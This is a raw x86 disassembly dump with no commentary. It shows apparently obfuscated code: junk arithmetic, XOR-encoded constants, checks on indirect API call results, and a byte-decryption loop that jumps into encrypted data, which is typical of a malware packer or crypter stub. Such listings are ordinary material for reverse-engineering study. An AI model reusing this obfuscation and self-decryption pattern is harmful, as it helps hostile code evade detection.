  401df8:	xor    DWORD PTR ds:0x434008,0x435014
  401e02:	push   0x43a520
  401e07:	push   ebx
  401e08:	push   ebx
  401e09:	call   DWORD PTR ds:0x43a8fc
  401e0f:	test   eax,eax
  401e11:	mov    DWORD PTR ds:0x435004,0x62c7
  401e1b:	jne    0x40241c
  401e21:	sub    DWORD PTR ds:0x437000,0x3add
  401e2b:	push   0xd
  401e2d:	push   0x43a530
  401e32:	call   DWORD PTR ds:0x43a908
  401e38:	test   eax,eax
  401e3a:	mov    DWORD PTR ds:0x435010,0x130a
  401e44:	jne    0x402440
  401e4a:	and    DWORD PTR ds:0x434018,0x434024
  401e54:	push   0x43a544
  401e59:	push   ebx
  401e5a:	push   ebx
  401e5b:	call   DWORD PTR ds:0x43a8ec
  401e61:	test   eax,eax
  401e63:	mov    DWORD PTR ds:0x436008,0x3823
  401e6d:	jne    0x402440
  401e73:	adc    DWORD PTR ds:0x436014,0x437014
  401e7d:	push   0x9
  401e7f:	sub    DWORD PTR ds:0x437014,0x437010
  401e89:	push   0x43a55c
  401e8e:	call   DWORD PTR ds:0x43a8cc
  401e94:	not    DWORD PTR ds:0x43800c
  401e9a:	test   eax,eax
  401e9c:	mov    DWORD PTR ds:0x43501c,0x69de
  401ea6:	jne    0x40241c
  401eac:	sbb    DWORD PTR ds:0x436018,0x435008
  401eb6:	push   0x43a578
  401ebb:	push   ebx
  401ebc:	sub    DWORD PTR ds:0x438018,0x435008
  401ec6:	push   ebx
  401ec7:	call   DWORD PTR ds:0x43a8fc
  401ecd:	test   eax,eax
  401ecf:	mov    DWORD PTR ds:0x435018,0x17d7
  401ed9:	jne    0x40241c
  401edf:	sub    DWORD PTR ds:0x436010,0x435008
  401ee9:	push   0xd
  401eeb:	adc    DWORD PTR ds:0x43700c,0x43400c
  401ef5:	push   0x43a588
  401efa:	sbb    DWORD PTR ds:0x437014,0x437000
  401f04:	call   DWORD PTR ds:0x43a908
  401f0a:	test   eax,eax
  401f0c:	mov    DWORD PTR ds:0x434024,0x6a5c
  401f16:	jne    0x402440
  401f1c:	mov    eax,DWORD PTR [ebp-0x8]
  401f1f:	and    DWORD PTR ds:0x43500c,0x0
  401f29:	mov    ecx,DWORD PTR ds:0x43500c
  401f2f:	inc    ecx
  401f30:	mov    DWORD PTR ds:0x43500c,ecx
  401f36:	cmp    DWORD PTR ds:0x43500c,0x9
  401f3d:	ja     0x401f75
  401f43:	jmp    0x401f4e
  401f48:	call   DWORD PTR ds:0x43a904
  401f4e:	cmp    DWORD PTR ds:0x43500c,0x8
  401f55:	jne    0x401f68
  401f5b:	mov    ecx,DWORD PTR ds:0x43500c
  401f61:	inc    ecx
  401f62:	mov    DWORD PTR ds:0x43500c,ecx
  401f68:	cmp    DWORD PTR ds:0x43500c,0x14
  401f6f:	jb     0x401f29
  401f75:	mov    ecx,DWORD PTR [ebp-0x7c]
  401f78:	xor    eax,esi
  401f7a:	dec    DWORD PTR ds:0x43700c
  401f80:	add    eax,edi
  401f82:	mov    DWORD PTR ds:0x434010,0x1014
  401f8c:	cmp    eax,ecx
  401f8e:	jne    0x4023c3
  401f94:	sbb    DWORD PTR ds:0x437018,0x6417
  401f9e:	mov    eax,DWORD PTR [ebp-0x8]
  401fa1:	mov    ecx,DWORD PTR ds:0x43a2d4
  401fa7:	and    DWORD PTR ds:0x438014,0xc31
  401fb1:	mov    ecx,DWORD PTR [ecx+0x198]
  401fb7:	xor    eax,esi
  401fb9:	sub    DWORD PTR ds:0x436008,0x435010
  401fc3:	add    eax,edi
  401fc5:	cmp    eax,DWORD PTR [ecx]
  401fc7:	jne    0x402025
  401fcd:	movzx  eax,WORD PTR ds:0x435014
  401fd4:	and    DWORD PTR ds:0x434010,eax
  401fda:	mov    eax,DWORD PTR [ebp-0x8]
  401fdd:	adc    DWORD PTR ds:0x434018,0x436008
  401fe7:	push   0xf89c8585
  401fec:	xor    eax,esi
  401fee:	add    eax,edi
  401ff0:	adc    DWORD PTR ds:0x437018,0x127f
  401ffa:	push   eax
  401ffb:	dec    DWORD PTR ds:0x436004
  402001:	push   0xf89c85b9
  402006:	sbb    DWORD PTR ds:0x43501c,0x43600c
  402010:	push   DWORD PTR [ebp-0xc]
  402013:	and    DWORD PTR ds:0x434024,0x7b2c
  40201d:	push   DWORD PTR [ebp-0x8]
  402020:	call   0x407a51
  402025:	mov    eax,DWORD PTR [ebp-0xc]
  402028:	mov    DWORD PTR [ebp-0x4c],eax
  40202b:	mov    eax,DWORD PTR [ebp-0x8]
  40202e:	mov    DWORD PTR [ebp-0x60],eax
  402031:	mov    eax,DWORD PTR [ebp-0x60]
  402034:	xor    eax,esi
  402036:	add    eax,edi
  402038:	mov    DWORD PTR [ebp+0x10],eax
  40203b:	mov    eax,ds:0x43a154
  402040:	mov    eax,DWORD PTR [eax]
  402042:	mov    DWORD PTR [ebp+0x10],eax
  402045:	mov    eax,ds:0x43a35c
  40204a:	mov    eax,DWORD PTR [eax]
  40204c:	mov    DWORD PTR [ebp-0x18],eax
  40204f:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402056:	mov    eax,DWORD PTR [ebp+0xc]
  402059:	xor    eax,esi
  40205b:	add    eax,edi
  40205d:	mov    DWORD PTR [ebp+0xc],eax
  402060:	mov    eax,ds:0x43a2d4
  402065:	mov    DWORD PTR [ebp+0xc],eax
  402068:	mov    eax,DWORD PTR [ebp+0x10]
  40206b:	mov    DWORD PTR [ebp+0xc],eax
  40206e:	mov    eax,DWORD PTR [ebp+0xc]
  402071:	push   0x4
  402073:	pop    ecx
  402074:	sub    ecx,eax
  402076:	add    ecx,DWORD PTR [ebp-0x18]
  402079:	mov    DWORD PTR [ebp-0x38],0xf89c85c5
  402080:	mov    DWORD PTR [ebp+0x10],ecx
  402083:	mov    DWORD PTR [ebp-0x108],0xf89c85b9
  40208d:	mov    eax,DWORD PTR [ebp+0xc]
  402090:	mov    DWORD PTR [ebp-0x104],eax
  402096:	mov    eax,DWORD PTR [ebp+0x10]
  402099:	mov    DWORD PTR [ebp-0x100],eax
  40209f:	mov    eax,DWORD PTR [ebp-0x38]
  4020a2:	xor    eax,esi
  4020a4:	add    eax,edi
  4020a6:	mov    DWORD PTR [ebp-0xfc],eax
  4020ac:	lea    eax,[ebp-0x98]
  4020b2:	mov    DWORD PTR [ebp-0xf8],eax
  4020b8:	mov    eax,DWORD PTR [ebp-0x108]
  4020be:	xor    eax,esi
  4020c0:	add    eax,edi
  4020c2:	mov    DWORD PTR [ebp-0x108],eax
  4020c8:	lea    eax,[ebp-0x108]
  4020ce:	push   eax
  4020cf:	mov    eax,DWORD PTR [ebp-0x4c]
  4020d2:	xor    eax,esi
  4020d4:	add    eax,edi
  4020d6:	push   eax
  4020d7:	mov    eax,ds:0x43a2f4
  4020dc:	push   0x43a24a
  4020e1:	push   DWORD PTR [eax]
  4020e3:	call   0x404c64
  4020e8:	mov    eax,DWORD PTR [ebp+0xc]
  4020eb:	mov    ecx,DWORD PTR [ebp+0x10]
  4020ee:	mov    DWORD PTR [ebp-0x84],ecx
  4020f4:	mov    ecx,DWORD PTR [ebp-0x60]
  4020f7:	xor    ecx,esi
  4020f9:	mov    DWORD PTR [ebp-0x18],eax
  4020fc:	add    ecx,edi
  4020fe:	jmp    0x402361
  402103:	lea    edx,[ecx+eax*1]
  402106:	mov    DWORD PTR [ebp+0x10],edx
  402109:	mov    edx,DWORD PTR [ebp-0x84]
  40210f:	sub    edx,ecx
  402111:	mov    DWORD PTR [ebp+0xc],edx
  402114:	mov    edx,DWORD PTR [ebp+0xc]
  402117:	mov    DWORD PTR [ebp-0x54],edx
  40211a:	mov    edx,DWORD PTR [ebp+0x10]
  40211d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  402124:	mov    DWORD PTR [ebp-0x6c],edx
  402127:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  40212e:	mov    edx,DWORD PTR [ebp-0x50]
  402131:	xor    edx,esi
  402133:	add    edx,edi
  402135:	mov    DWORD PTR [ebp+0x10],edx
  402138:	mov    edx,DWORD PTR [ebp-0x50]
  40213b:	xor    edx,esi
  40213d:	add    edx,edi
  40213f:	mov    DWORD PTR [ebp+0xc],edx
  402142:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402149:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  402150:	mov    edx,DWORD PTR [ebp-0x50]
  402153:	mov    ebx,DWORD PTR [ebp-0x54]
  402156:	xor    edx,esi
  402158:	add    edx,edi
  40215a:	cmp    ebx,edx
  40215c:	je     0x402355
  402162:	mov    eax,DWORD PTR [ebp-0x24]
  402165:	xor    eax,esi
  402167:	mov    edx,0xffcd8d1e
  40216c:	sub    edx,eax
  40216e:	add    edx,DWORD PTR [ebp-0x54]
  402171:	mov    eax,DWORD PTR [ebp-0x24]
  402174:	mov    ebx,DWORD PTR [ebp+0x10]
  402177:	xor    eax,esi
  402179:	add    eax,edi
  40217b:	imul   eax,ebx
  40217e:	cmp    eax,edx
  402180:	ja     0x402352
  402186:	mov    edx,DWORD PTR [ebp+0x10]
  402189:	mov    eax,DWORD PTR [ebp-0x54]
  40218c:	mov    ebx,DWORD PTR [ebp-0x68]
  40218f:	sub    eax,edx
  402191:	xor    ebx,esi
  402193:	xor    edx,edx
  402195:	add    ebx,edi
  402197:	div    ebx
  402199:	mov    DWORD PTR [ebp+0xc],eax
  40219c:	mov    eax,DWORD PTR [ebp-0x74]
  40219f:	mov    edx,DWORD PTR [ebp+0xc]
  4021a2:	xor    eax,esi
  4021a4:	add    eax,edi
  4021a6:	cmp    edx,eax
  4021a8:	jbe    0x4021b8
  4021ae:	mov    eax,DWORD PTR [ebp-0x74]
  4021b1:	xor    eax,esi
  4021b3:	add    eax,edi
  4021b5:	mov    DWORD PTR [ebp+0xc],eax
  4021b8:	mov    eax,DWORD PTR [ebp-0x68]
  4021bb:	mov    edx,DWORD PTR [ebp+0xc]
  4021be:	xor    eax,esi
  4021c0:	add    eax,edi
  4021c2:	imul   eax,edx
  4021c5:	mov    DWORD PTR [ebp+0xc],eax
  4021c8:	mov    eax,DWORD PTR [ebp-0x50]
  4021cb:	mov    edx,DWORD PTR [ebp+0xc]
  4021ce:	xor    eax,esi
  4021d0:	add    eax,edi
  4021d2:	cmp    edx,eax
  4021d4:	je     0x40233b
  4021da:	mov    eax,DWORD PTR [ebp+0xc]
  4021dd:	mov    DWORD PTR [ebp-0x3c],eax
  4021e0:	mov    eax,DWORD PTR [ebp+0x10]
  4021e3:	add    eax,DWORD PTR [ebp-0x6c]
  4021e6:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  4021ed:	mov    DWORD PTR [ebp-0x30],eax
  4021f0:	mov    eax,0xf89c8584
  4021f5:	mov    DWORD PTR [ebp-0x64],eax
  4021f8:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4021ff:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402206:	mov    DWORD PTR [ebp-0x2c],eax
  402209:	mov    eax,DWORD PTR [ebp-0x38]
  40220c:	xor    eax,esi
  40220e:	add    eax,edi
  402210:	jmp    0x4022f7
  402215:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  40221c:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  402223:	mov    eax,DWORD PTR [ebp-0x2c]
  402226:	mov    edx,DWORD PTR [ebp+0xc]
  402229:	xor    eax,esi
  40222b:	add    eax,edi
  40222d:	imul   eax,edx
  402230:	mov    edx,DWORD PTR [ebp-0x30]
  402233:	mov    al,BYTE PTR [eax+edx*1]
  402236:	mov    BYTE PTR [ebp-0x1],al
  402239:	mov    eax,DWORD PTR [ebp-0x2c]
  40223c:	mov    edx,DWORD PTR [ebp+0xc]
  40223f:	xor    eax,esi
  402241:	add    eax,edi
  402243:	imul   eax,edx
  402246:	mov    edx,DWORD PTR [ebp-0x58]
  402249:	xor    edx,esi
  40224b:	add    eax,edx
  40224d:	mov    edx,DWORD PTR [ebp-0x30]
  402250:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402258:	mov    edx,DWORD PTR [ebp-0x78]
  40225b:	xor    edx,esi
  40225d:	lea    eax,[edx+eax*1+0x3272e2]
  402264:	movzx  edx,BYTE PTR [ebp-0x1]
  402268:	xor    edx,eax
  40226a:	mov    BYTE PTR [ebp-0x1],dl
  40226d:	mov    al,BYTE PTR [ebp-0x1]
  402270:	mov    edx,DWORD PTR [ebp-0x2c]
  402273:	mov    ebx,DWORD PTR [ebp+0xc]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	imul   edx,ebx
  40227d:	mov    ebx,DWORD PTR [ebp-0x30]
  402280:	mov    BYTE PTR [edx+ebx*1],al
  402283:	mov    eax,DWORD PTR [ebp-0x2c]
  402286:	mov    edx,DWORD PTR [ebp+0xc]
  402289:	xor    eax,esi
  40228b:	add    eax,edi
  40228d:	imul   eax,edx
  402290:	mov    edx,DWORD PTR [ebp-0x30]
  402293:	mov    al,BYTE PTR [eax+edx*1]
  402296:	mov    BYTE PTR [ebp-0x1],al
  402299:	mov    eax,DWORD PTR [ebp-0x2c]
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	xor    eax,esi
  4022a1:	add    eax,edi
  4022a3:	imul   eax,edx
  4022a6:	mov    edx,DWORD PTR [ebp-0x64]
  4022a9:	xor    edx,esi
  4022ab:	add    eax,edx
  4022ad:	mov    edx,DWORD PTR [ebp-0x30]
  4022b0:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  4022b8:	mov    edx,DWORD PTR [ebp-0x80]
  4022bb:	xor    edx,esi
  4022bd:	lea    eax,[edx+eax*1+0x3272e2]
  4022c4:	movzx  edx,BYTE PTR [ebp-0x1]
  4022c8:	xor    edx,eax
  4022ca:	mov    BYTE PTR [ebp-0x1],dl
  4022cd:	mov    al,BYTE PTR [ebp-0x1]
  4022d0:	mov    edx,DWORD PTR [ebp-0x2c]
  4022d3:	mov    ebx,DWORD PTR [ebp+0xc]
  4022d6:	xor    edx,esi
  4022d8:	add    edx,edi
  4022da:	imul   edx,ebx
  4022dd:	mov    ebx,DWORD PTR [ebp-0x30]
  4022e0:	mov    BYTE PTR [edx+ebx*1],al
  4022e3:	mov    eax,DWORD PTR [ebp-0x10]
  4022e6:	mov    edx,DWORD PTR [ebp-0x64]
  4022e9:	xor    eax,esi
  4022eb:	xor    edx,esi
  4022ed:	add    eax,edi
  4022ef:	add    edx,edi
  4022f1:	imul   eax,edx
  4022f4:	add    eax,DWORD PTR [ebp+0xc]
  4022f7:	mov    DWORD PTR [ebp+0xc],eax
  4022fa:	mov    eax,DWORD PTR [ebp+0xc]
  4022fd:	mov    edx,DWORD PTR [ebp-0x3c]
  402300:	cmp    edx,eax
  402302:	jb     0x402215
  402308:	mov    eax,DWORD PTR [ebp-0x64]
  40230b:	mov    edx,DWORD PTR [ebp-0x3c]
  40230e:	xor    eax,esi
  402310:	add    eax,edi
  402312:	imul   eax,edx
  402315:	mov    edx,DWORD PTR [ebp-0x38]
  402318:	xor    edx,esi
  40231a:	add    edx,edi
  40231c:	or     eax,edx
  40231e:	mov    edx,DWORD PTR [ebp-0x24]
  402321:	xor    edx,esi
  402323:	add    eax,edx
  402325:	mov    edx,DWORD PTR [ebp-0x24]
  402328:	xor    edx,esi
  40232a:	add    eax,edx
  40232c:	mov    edx,DWORD PTR [ebp+0x10]
  40232f:	lea    eax,[eax+edx*1+0x64e5c4]
  402336:	jmp    0x40234a
  40233b:	mov    eax,DWORD PTR [ebp-0x24]
  40233e:	mov    edx,DWORD PTR [ebp+0x10]
  402341:	xor    eax,esi
  402343:	lea    eax,[eax+edx*1+0x3272e2]
  40234a:	mov    DWORD PTR [ebp+0x10],eax
  40234d:	jmp    0x402162
  402352:	mov    eax,DWORD PTR [ebp-0x18]
  402355:	mov    edx,DWORD PTR [ebp-0x4c]
  402358:	xor    edx,esi
  40235a:	lea    ecx,[ecx+edx*1+0x3272e2]
  402361:	lea    edx,[ecx-0x3272e2]
  402367:	xor    edx,esi
  402369:	cmp    edx,0xf89c9585
  40236f:	jne    0x402103
  402375:	mov    ecx,DWORD PTR [ebp-0x60]
  402378:	mov    edx,DWORD PTR [ebp-0x4c]
  40237b:	mov    ebx,DWORD PTR [ebp-0x60]
  40237e:	xor    edx,esi
  402380:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402387:	xor    ecx,esi
  402389:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  402390:	xor    ebx,esi
  402392:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402399:	mov    edx,DWORD PTR [ebp-0x4c]
  40239c:	xor    edx,esi
  40239e:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  4023a5:	mov    eax,DWORD PTR [ebp-0x4c]
  4023a8:	mov    eax,DWORD PTR [ebp-0x8]
  4023ab:	xor    eax,esi
  4023ad:	add    eax,edi
  4023af:	mov    ds:0x43a358,eax
  4023b4:	mov    eax,DWORD PTR [ebp-0x8]
  4023b7:	xor    eax,esi
  4023b9:	add    eax,edi
  4023bb:	xor    ebx,ebx
  4023bd:	mov    ds:0x43a350,eax
  4023c2:	inc    ebx
  4023c3:	lea    eax,[ebp-0x40]
  4023c6:	mov    DWORD PTR [ebp-0x88],eax
  4023cc:	lea    eax,[ebp+0x4]
  4023cf:	mov    DWORD PTR [ebp-0x40],eax
  4023d2:	mov    eax,DWORD PTR [ebp-0x40]
  4023d5:	test   eax,eax
  4023d7:	je     0x402572
  4023dd:	push   0x43a59c
  4023e2:	push   ebx
  4023e3:	push   ebx
  4023e4:	call   DWORD PTR ds:0x43a8ec
  4023ea:	test   eax,eax
  4023ec:	jne    0x402440
  4023f2:	push   0x9
  4023f4:	push   0x43a5b4
  4023f9:	call   DWORD PTR ds:0x43a8cc
  4023ff:	test   eax,eax
  402401:	jne    0x40241c
  402407:	push   0x43a5d0
  40240c:	push   ebx
  40240d:	push   ebx
  40240e:	call   DWORD PTR ds:0x43a8fc
  402414:	test   eax,eax
  402416:	je     0x40242b
  40241c:	lea    eax,[ebp-0x20]
  40241f:	push   eax
  402420:	call   DWORD PTR ds:0x43a8bc
  402426:	jmp    0x40258d
  40242b:	push   0xd
  40242d:	push   0x43a5e0
  402432:	call   DWORD PTR ds:0x43a908
  402438:	test   eax,eax
  40243a:	je     0x402447
  402440:	xor    eax,eax
  402442:	jmp    0x40258d
  402447:	mov    DWORD PTR [ebp-0x94],0xf152c3c
  402451:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  40245b:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  402465:	mov    DWORD PTR [ebp-0x90],0x72670a1d
  40246f:	call   0x405387
  402474:	mov    eax,DWORD PTR [ebp-0x28]
  402477:	mov    eax,DWORD PTR [ebp-0xc]
  40247a:	mov    eax,DWORD PTR [ebp-0x8]
  40247d:	mov    DWORD PTR [ebp+0xc],eax
  402480:	mov    eax,eax
  402482:	mov    eax,ds:0x43a2d4
  402487:	mov    eax,DWORD PTR [eax+0x1c8]
  40248d:	mov    eax,DWORD PTR [eax]
  40248f:	cdq    
  402490:	mov    ebx,eax
  402492:	mov    eax,0xfabdbee7
  402497:	add    ebx,eax
  402499:	adc    edx,0xffffffff
  40249c:	and    DWORD PTR [ebp-0x10],0x0
  4024a0:	xor    edx,0x0
  4024a3:	mov    DWORD PTR [ebp-0x6c],edx
  4024a6:	mov    edx,DWORD PTR [ebp+0xc]
  4024a9:	mov    DWORD PTR [ebp-0x14],edx
  4024ac:	mov    ecx,0x8a29a12d
  4024b1:	xor    ebx,ecx
  4024b3:	add    DWORD PTR [ebp-0x14],eax
  4024b6:	mov    edx,DWORD PTR [ebp-0x14]
  4024b9:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4024bd:	xor    edx,ecx
  4024bf:	mov    DWORD PTR [ebp-0x5c],edx
  4024c2:	mov    edx,DWORD PTR [ebp-0x10]
  4024c5:	xor    edx,0x0
  4024c8:	mov    DWORD PTR [ebp-0x58],edx
  4024cb:	cmp    DWORD PTR [ebp-0x5c],ebx
  4024ce:	jne    0x4024e0
  4024d4:	mov    edx,DWORD PTR [ebp-0x6c]
  4024d7:	cmp    DWORD PTR [ebp-0x58],edx
  4024da:	je     0x40250f
  4024e0:	mov    edx,DWORD PTR ds:0x43a2d4
  4024e6:	mov    edx,DWORD PTR [edx+0x1c0]
  4024ec:	mov    edx,DWORD PTR [edx]
  4024ee:	xor    ebx,ebx
  4024f0:	add    edx,eax
  4024f2:	adc    ebx,0xffffffff
  4024f5:	xor    edx,ecx
  4024f7:	xor    ebx,0x0
  4024fa:	cmp    edx,0x70941fc5
  402500:	jne    0x402572
  402506:	cmp    ebx,0xffffffff
  402509:	jne    0x402572
  40250f:	mov    edx,DWORD PTR ds:0x43a350
  402515:	mov    ebx,DWORD PTR ds:0x43a358
  40251b:	xor    edx,ebx
  40251d:	mov    DWORD PTR ds:0x43a350,edx
  402523:	mov    edx,DWORD PTR [ebp-0x40]
  402526:	mov    ebx,DWORD PTR ds:0x43a350
  40252c:	add    ebx,DWORD PTR [edx]
  40252e:	mov    edx,DWORD PTR [ebp-0x40]
  402531:	mov    DWORD PTR [edx],ebx
  402533:	mov    edx,DWORD PTR [ebp+0xc]
  402536:	xor    esi,edx
  402538:	mov    edx,DWORD PTR ds:0x43a350
  40253e:	add    esi,edi
  402540:	xor    ebx,ebx
  402542:	add    esi,eax
  402544:	adc    ebx,0xffffffff
  402547:	xor    edi,edi
  402549:	xor    esi,ecx
  40254b:	xor    ebx,0x0
  40254e:	add    edx,eax
  402550:	adc    edi,0xffffffff
  402553:	xor    edx,ecx
  402555:	xor    edi,0x0
  402558:	cmp    edx,esi
  40255a:	jne    0x402572
  402560:	cmp    edi,ebx
  402562:	jne    0x402572
  402568:	mov    eax,ds:0x43a350
  40256d:	mov    ds:0x43a358,eax
  402572:	mov    eax,ds:0x43a2d4
  402577:	push   0x4
  402579:	add    eax,0x1cc
  40257e:	push   eax
  40257f:	lea    eax,[ebp-0x28]
  402582:	push   eax
  402583:	call   0x402598
  402588:	mov    eax,DWORD PTR [ebp-0x28]
  40258b:	mov    eax,DWORD PTR [eax]
  40258d:	pop    edi
  40258e:	pop    ebx
  40258f:	pop    esi
  402590:	leave  
  402591:	ret    0xc
  402594:	xor    eax,eax
  402596:	inc    eax
  402597:	ret    
  402598:	push   ebp
  402599:	mov    ebp,esp
  40259b:	sub    esp,0x10
  40259e:	mov    ecx,DWORD PTR ds:0x438004
  4025a4:	sbb    ecx,DWORD PTR ds:0x434000
  4025aa:	mov    DWORD PTR ds:0x438004,ecx
  4025b0:	mov    eax,0xf89c8585
  4025b5:	add    DWORD PTR ds:0x437018,0x7358
  4025bf:	mov    DWORD PTR [ebp-0x4],eax
  4025c2:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4025c9:	movzx  edx,WORD PTR ds:0x436014
  4025d0:	sub    DWORD PTR ds:0x43701c,edx
  4025d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4025d9:	dec    edx
  4025da:	jmp    0x404996
  4025df:	sub    DWORD PTR [edx+0x13b763cc],eax
  4025e5:	jae    0x402659
  4025e7:	xchg   ecx,eax
  4025e8:	xchg   esp,eax
  4025e9:	pop    ecx
  4025ea:	int3   
  4025eb:	mov    esi,0x7c113736
  4025f0:	jl     0x40266e
  4025f2:	jl     0x4025c7
  4025f4:	pop    edi
  4025f5:	jl     0x402673
  4025f7:	adc    eax,0x1139172e
  4025fc:	and    eax,0x30652f13
  402601:	popa   
  402602:	pusha  
  402603:	sar    BYTE PTR [edx+0x6c],1
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	xor    al,0xc5
  40260a:	fdivp  st(1),st
  40260c:	push   0x42
  40260e:	arpl   WORD PTR [ecx+0x53],di
  402611:	stos   BYTE PTR es:[edi],al
  402612:	jp     0x402681
  402614:	push   ecx
  402615:	iret   
  402616:	pop    ebp
  402617:	dec    esp
  402618:	cmp    cl,BYTE PTR [esi+0x577087fc]
  40261e:	dec    ebp
  40261f:	jg     0x402658
  402621:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402627:	jmp    DWORD PTR cs:[eax-0x22]
  40262b:	cld    
  40262c:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402630:	xor    ebp,ecx
  402632:	mov    esp,0xd82b87ed
  402637:	and    DWORD PTR [ecx],0xf
  40263a:	push   ecx
  40263b:	mov    ds:0x6df7c68c,eax
  402640:	fld    QWORD PTR [esi]
  402642:	(bad)  
  402643:	or     ah,bh
  402645:	and    BYTE PTR [edx],dl
  402647:	inc    edx
  402648:	push   cs
  402649:	and    BYTE PTR [ebx+0x62],ah
  40264c:	mov    cl,0xaf
  40264e:	sub    ebx,DWORD PTR [ecx+0x5]
  402651:	mov    al,ds:0x2341e1ff
  402656:	jbe    0x40268c
  402658:	ret    0xf153
  40265b:	sbb    al,0xfc
  40265d:	jb     0x402618
  40265f:	jnp    0x40263e
  402661:	xchg   edx,eax
  402662:	pop    edi
  402663:	cmp    DWORD PTR [ecx+0x49841607],0xb
  40266a:	cwde   
  40266b:	ds je  0x4025f9
  40266e:	add    ebx,esp
  402670:	sub    eax,0x4b368d54
  402675:	push   esi
  402676:	sti    
  402677:	iret   
  402678:	mov    WORD PTR [ecx],fs
  40267a:	or     edx,0x6982ceb7
  402680:	out    0x45,al
  402682:	push   esp
  402683:	dec    esi
  402684:	push   cs
  402685:	cmp    BYTE PTR [ebx],cl
  402687:	xor    BYTE PTR [ebx],bl
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    ebx
  40268b:	int3   
  40268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268d:	dec    edx
  40268e:	fiadd  DWORD PTR [esi]
  402690:	push   eax
  402691:	std    
  402692:	push   esp
  402693:	push   eax
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	icebp  
  402696:	bound  edi,QWORD PTR [edi-0xde2bb0e]
  40269c:	inc    ebx
  40269d:	nop
  40269e:	jge    0x4026da
  4026a0:	lock imul eax,DWORD PTR [ecx],0x59
  4026a4:	out    dx,al
  4026a5:	push   ds
  4026a6:	(bad)  [edi]
  4026a8:	frstor [edi+0x1c2a10a9]
  4026ae:	pop    ebp
  4026af:	mov    eax,ds:0xb9f75742
  4026b4:	xchg   esi,eax
  4026b5:	sbb    bh,bl
  4026b7:	add    ebp,DWORD PTR [ebx]
  4026b9:	in     eax,0xed
  4026bb:	loop   0x402694
  4026bd:	sub    DWORD PTR [esp+ebp*8-0x11],esp
  4026c1:	jp     0x40271b
  4026c3:	test   DWORD PTR [edi-0x25],0xcffa6573
  4026ca:	mov    cl,0xb2
  4026cc:	cmp    DWORD PTR [esi+ecx*1-0x30ad1cf8],esp
  4026d3:	call   0x97b9e688
  4026d8:	or     bl,ch
  4026da:	adc    ebp,DWORD PTR ds:0x8e2166af
  4026e0:	inc    ebx
  4026e1:	fisttp DWORD PTR [esi+0x6d]
  4026e4:	sub    BYTE PTR [ebx+0x62d096a6],dh
  4026ea:	dec    ecx
  4026eb:	xlat   BYTE PTR ds:[ebx]
  4026ec:	push   cs
  4026ed:	inc    ebp
  4026ee:	es dec esp
  4026f0:	adc    ebx,DWORD PTR [esi]
  4026f2:	mov    dl,0x33
  4026f4:	add    eax,0xaaea249e
  4026f9:	push   edi
  4026fa:	ins    BYTE PTR es:[edi],dx
  4026fb:	pop    ss
  4026fc:	fnstsw WORD PTR [ebx+0x5]
  4026ff:	xor    dl,BYTE PTR [edi+0x4e]
  402702:	rcr    edi,cl
  402704:	pop    ebp
  402705:	sahf   
  402706:	mov    edi,0x31ea397
  40270b:	cs aaa 
  40270d:	fwait
  40270e:	pop    ebx
  40270f:	jmp    0x4241:0x120aa3f0
  402716:	xor    al,0xce
  402718:	xchg   ebp,eax
  402719:	and    ecx,eax
  40271b:	xor    al,0x2f
  40271d:	mov    ebp,0x67181087
  402722:	cmc    
  402723:	xchg   ecx,eax
  402724:	fstp   QWORD PTR [ebp+0x4e]
  402727:	and    bx,di
  40272a:	sub    BYTE PTR [eax-0x35339465],0x92
  402731:	fidivr DWORD PTR [eax]
  402733:	push   ebp
  402734:	aam    0x28
  402736:	inc    ebp
  402737:	add    ecx,DWORD PTR [esi]
  402739:	in     al,dx
  40273a:	je     0x40279f
  40273c:	xchg   ebp,eax
  40273d:	loope  0x4027b1
  40273f:	repnz ins DWORD PTR es:[edi],dx
  402741:	ror    DWORD PTR [ecx],0xcf
  402744:	ret    
  402745:	or     DWORD PTR [ebx],eax
  402747:	imul   BYTE PTR [ecx+0x3c2b9b35]
  40274d:	ins    DWORD PTR es:[edi],dx
  40274e:	pop    ebx
  40274f:	cmc    
  402750:	push   ss
  402751:	mov    ecx,0x76caf3bb
  402756:	push   es
  402757:	int    0x2c
  402759:	jge    0x4026db
  40275b:	and    cl,al
  40275d:	sti    
  40275e:	add    DWORD PTR [eax-0x1a],ebx
  402761:	ror    BYTE PTR [eax-0x6],1
  402764:	push   ds
  402765:	xor    al,BYTE PTR [esi+0x2908cd65]
  40276b:	leave  
  40276c:	adc    al,0x5f
  40276e:	push   es
  40276f:	icebp  
  402770:	mov    cl,0x93
  402772:	push   ss
  402773:	jo     0x40276f
  402775:	or     BYTE PTR [esi+0x9],dl
  402778:	popa   
  402779:	xor    dl,BYTE PTR [ebx+0x46]
  40277c:	inc    eax
  40277d:	push   ss
  40277e:	out    dx,eax
  40277f:	(bad)
  402782:	ds adc eax,0x9fb071b
  402788:	sbb    BYTE PTR [ecx],dl
  40278a:	inc    ecx
  40278b:	sbb    eax,0xb6944e95
